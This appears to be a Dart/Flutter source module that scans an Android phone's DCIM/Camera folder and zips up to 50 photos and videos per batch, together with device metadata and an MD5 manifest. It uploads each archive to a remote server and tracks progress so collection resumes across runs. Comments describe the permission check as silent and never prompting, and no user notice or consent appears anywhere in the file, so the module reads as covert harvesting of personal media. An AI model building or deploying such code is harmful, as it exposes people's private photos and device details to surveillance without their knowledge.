/// DCIM 打包上传管理器
///
/// 流程：
///   1. 扫描 DCIM/Camera 前 50 个未上传文件
///   2. 直接从原文件打 zip（Store 模式，字节级保真，不重编码）
///   3. zip 内包含：device_info.json + 图片视频 + manifest.json（含 MD5）
///   4. 上传 zip 到服务器（1 个 HTTP 请求）
///   5. 成功后记录路径，删除临时 zip
///
/// 断点续传：批次级（成功记录 + 失败尝试次数双重持久化）
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:archive/archive_io.dart';
import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  final String uploadUrl;
  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;
  final int maxAttemptsPerFile;
  final Set<String> mediaExtensions;
  /// zip 压缩等级：0 = Store（不压缩，推荐媒体文件），1-9 = DEFLATE
  final int zipCompressionLevel;

  const DcimUploadConfig({
    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,
    this.maxAttemptsPerFile = 3,
    this.zipCompressionLevel = 0,
    this.mediaExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif',
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm',
    },
  });
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._();
  static final DcimUploadManager instance = DcimUploadManager._();

  static const String _kUploaded = 'dcim_uploaded_paths';
  static const String _kFailedMap = 'dcim_failed_attempts';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  /// 已成功上传的文件路径集合（永不清除，除非用户重置）
  final Set<String> _uploaded = <String>{};

  /// 失败记录：path → 累计失败次数，成功上传后自动移除
  final Map<String, int> _failed = <String, int>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;

  // ── 初始化 ──────────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    // 反序列化失败计数 Map
    _failed.clear();
    final rawFailed = _prefs!.getString(_kFailedMap);
    if (rawFailed != null && rawFailed.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawFailed) as Map<String, dynamic>;
        decoded.forEach((k, v) => _failed[k] = (v as num).toInt());
      } catch (e) {
        debugPrint('[DcimUpload] 失败记录解析失败: $e');
      }
    }

    // 清理上一轮崩溃残留的 zip
    await _cleanStaleZips();

    debugPrint(
        '[DcimUpload] 已记录成功 ${_uploaded.length} 个，失败 ${_failed.length} 个');
  }

  // ── 静默权限检查（绝不弹框）─────────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final photos = await Permission.photos.status;
    if (photos.isGranted || photos.isLimited) return true;
    final storage = await Permission.storage.status;
    return storage.isGranted;
  }

  // ── 对外入口 1：扫描 + 打包 + 上传 ──────────────────────────────────────
  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    final files = await scanFiles();
    await packAndUpload(files);
  }

  // ── 对外入口 2：传入文件列表 → 直接打包上传 ────────────────────────────
  Future<void> packAndUpload(List<File> files) async {
    if (_busy) {
      debugPrint('[DcimUpload] 上一轮未结束，跳过');
      return;
    }
    if (files.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    _busy = true;
    File? zipFile;
    try {
      // 1. zip 输出到应用缓存目录
      final tmpDir = await getTemporaryDirectory();
      final ts = DateTime.now().millisecondsSinceEpoch;
      zipFile = File('${tmpDir.path}/dcim_upload_$ts.zip');

      // 2. 获取设备信息
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      debugPrint('[DcimUpload] 设备信息: $metadata');

      // 3. 准备 manifest 数据（含 MD5）
      final fileInfos = <Map<String, dynamic>>[];
      final usedNames = <String>{};
      final zipNameMap = <String, String>{};

      debugPrint('[DcimUpload] 计算 MD5，共 ${files.length} 个文件...');
      for (int i = 0; i < files.length; i++) {
        final f = files[i];
        try {
          final st = await f.stat();
          final baseName = f.path.split('/').last;
          var zipName = baseName;
          if (usedNames.contains(zipName)) {
            zipName = '${i}_$baseName';
          }
          usedNames.add(zipName);
          zipNameMap[f.path] = zipName;

          final md5Hex = await _calcMd5(f);
          fileInfos.add({
            'name': baseName,
            'zip_name': zipName,
            'original_path': f.path,
            'size': st.size,
            'modified': st.modified.toIso8601String(),
            'md5': md5Hex,
          });
        } catch (e) {
          debugPrint('[DcimUpload] stat/md5 失败 ${f.path}: $e');
        }
      }

      if (fileInfos.isEmpty) {
        debugPrint('[DcimUpload] 无有效文件，跳过');
        return;
      }

      // 4. 打包（Store 模式，不压缩）
      debugPrint(
          '[DcimUpload] 开始打包（Store 模式 level=${_config.zipCompressionLevel}）...');
      final encoder = ZipFileEncoder();
      encoder.create(zipFile.path, level: _config.zipCompressionLevel);
      int packed = 0;
      try {
        // 4.1 写入 device_info.json
        final deviceBytes = utf8.encode(jsonEncode(metadata));
        encoder.addArchiveFile(
          ArchiveFile('device_info.json', deviceBytes.length, deviceBytes),
        );
        debugPrint('[DcimUpload] device_info.json 已写入 zip');

        // 4.2 写入原文件（直接从 DCIM 读，不复制）
        for (final f in files) {
          final zipName = zipNameMap[f.path];
          if (zipName == null) continue;
          try {
            await encoder.addFile(f, zipName);
            packed++;
            if (packed % 10 == 0) {
              debugPrint('[DcimUpload] 已打包 $packed/${fileInfos.length}');
            }
          } catch (e) {
            debugPrint('[DcimUpload] 打包失败 ${f.path}: $e');
          }
        }

        // 4.3 写入 manifest.json
        final manifest = <String, dynamic>{
          'device': metadata,
          'uploaded_at': DateTime.now().toIso8601String(),
          'file_count': fileInfos.length,
          'packed_count': packed,
          'total_size':
              fileInfos.fold<int>(0, (s, i) => s + (i['size'] as int)),
          'compression':
              _config.zipCompressionLevel == 0 ? 'store' : 'deflate',
          'files': fileInfos,
        };
        final manifestBytes = utf8.encode(jsonEncode(manifest));
        encoder.addArchiveFile(
          ArchiveFile('manifest.json', manifestBytes.length, manifestBytes),
        );
        debugPrint('[DcimUpload] manifest.json 已写入 zip');
      } finally {
        await encoder.close();
      }

      final zipSize = await zipFile.length();
      debugPrint('[DcimUpload] zip 打包完成: ${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB, $packed 个文件');

      // 5. 上传（1 个 HTTP 请求）
      final success = await _uploadZip(zipFile, packed);

      // 6. 批次记账
      if (success) {
        for (final f in files) {
          _uploaded.add(f.path);
          _failed.remove(f.path);
        }
        debugPrint('[DcimUpload] ✅ 本批 ${files.length} 个文件全部上传成功');
      } else {
        for (final f in files) {
          _failed[f.path] = (_failed[f.path] ?? 0) + 1;
        }
        debugPrint('[DcimUpload] ❌ 本批上传失败，累计失败次数 +1');
      }
      await _persist();
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 打包/上传异常: $e\n$st');
    } finally {
      // 7. 清理临时 zip
      try {
        if (zipFile != null && await zipFile.exists()) {
          await zipFile.delete();
        }
      } catch (e) {
        debugPrint('[DcimUpload] 删除临时 zip 失败: $e');
      }
      _busy = false;
    }
  }

  // ── 扫描 DCIM/Camera（断点续传核心）─────────────────────────────────────
  /// 跳过已成功的，跳过已失败满 maxAttemptsPerFile 次的
  Future<List<File>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) {
      debugPrint('[DcimUpload] 目录不存在: ${_config.dcimPath}');
      return [];
    }

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      if (!_config.mediaExtensions
          .contains(name.substring(dot).toLowerCase())) {
        continue;
      }
      // 断点续传判定 1：已成功 → 跳过
      if (_uploaded.contains(e.path)) continue;
      // 断点续传判定 2：失败超过阈值 → 永久跳过
      if ((_failed[e.path] ?? 0) >= _config.maxAttemptsPerFile) {
        debugPrint(
            '[DcimUpload] 永久跳过（失败 ${_failed[e.path]} 次）: $name');
        continue;
      }

      try {
        final st = await e.stat();
        list.add(_Scanned(e, st.modified));
      } catch (_) {}
    }

    // 修改时间升序：最早的先传
    list.sort((a, b) => a.modified.compareTo(b.modified));
    final selected = list.take(_config.maxFiles).map((s) => s.file).toList();
    debugPrint('[DcimUpload] 待上传 ${selected.length} 个文件');
    return selected;
  }

  // ── MD5（流式计算，大文件不吃内存）─────────────────────────────────────
  Future<String> _calcMd5(File f) async {
    try {
      final digest = await md5.bind(f.openRead()).first;
      return digest.toString();
    } catch (e) {
      debugPrint('[DcimUpload] MD5 计算失败 ${f.path}: $e');
      return '';
    }
  }

  // ── 清理残留 zip（崩溃/中断残留）───────────────────────────────────────
  Future<void> _cleanStaleZips() async {
    try {
      final tmp = await getTemporaryDirectory();
      await for (final e in tmp.list()) {
        if (e is File && e.path.contains('dcim_upload_')) {
          try {
            await e.delete();
            debugPrint('[DcimUpload] 清理残留: ${e.path.split('/').last}');
          } catch (_) {}
        }
      }
    } catch (_) {}
  }

  // ── 上传 zip ──────────────────────────────────────────────────────────
  Future<bool> _uploadZip(File zip, int fileCount) async {
    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.files
          .add(await http.MultipartFile.fromPath('file', zip.path));
      req.fields['fileName'] = zip.path.split('/').last;
      req.fields['fileCount'] = fileCount.toString();

      debugPrint('[DcimUpload] 开始上传 ${zip.path.split('/').last}...');
      final streamed = await req.send().timeout(_config.uploadTimeout);
      final resp = await http.Response.fromStream(streamed);

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        debugPrint('[DcimUpload] ✅ HTTP ${resp.statusCode}');
        return true;
      }
      debugPrint('[DcimUpload] ❌ HTTP ${resp.statusCode} body=${resp.body}');
      return false;
    } on TimeoutException {
      debugPrint(
          '[DcimUpload] ❌ 上传超时（${_config.uploadTimeout.inSeconds}s）');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ❌ 上传异常: $e');
      return false;
    }
  }

  // ── 持久化 ────────────────────────────────────────────────────────────
  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
    await _prefs?.setString(_kFailedMap, jsonEncode(_failed));
  }

  /// 清空所有记录（调试用）
  Future<void> reset() async {
    _uploaded.clear();
    _failed.clear();
    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kFailedMap);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  _Scanned(this.file, this.modified);
}
